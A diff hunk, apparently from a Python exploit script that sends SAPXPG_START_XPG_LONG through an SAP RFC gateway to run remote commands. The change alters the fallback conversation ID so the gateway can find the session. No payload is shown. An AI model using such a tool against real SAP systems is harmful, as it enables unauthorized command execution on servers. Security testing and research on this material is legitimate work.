@@ -1048,11 +1048,14 @@ def main():
         print("[*] No F_SAP_INIT ACK (Java gateway?) — proceeding with fallback conv_id")
 
     if not conv_id:
-        # Fallback: use "00000001" which is a valid-looking conv_id.
-        # Some Java gateways track the session internally and don't care what
-        # conv_id the client uses in subsequent packets.
-        conv_id = "00000001"
-        print("[*] Using fallback conv_id: %s" % conv_id)
+        # Fallback: reuse the same conv_id that was put in the P2 request header.
+        # build_saprfc_header_v6 defaults conv_id to b"0" + b"\x00"*7 when None.
+        # Kernel 754 silently stores the session under that key without sending
+        # an ACK.  Using "0" here causes pad_right_null("0", 8) to produce
+        # b"0\x00\x00\x00\x00\x00\x00\x00" which exactly matches the P2 header,
+        # so the gateway can look up the session in subsequent packets.
+        conv_id = "0"
+        print("[*] Using fallback conv_id: 0  (= b\"0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", matches P2 header)")
 
     # Step 3: F_SAP_SEND (SAPXPG_START_XPG_LONG)
     # SAP Java gateways send multiple NI frames in response to this step:
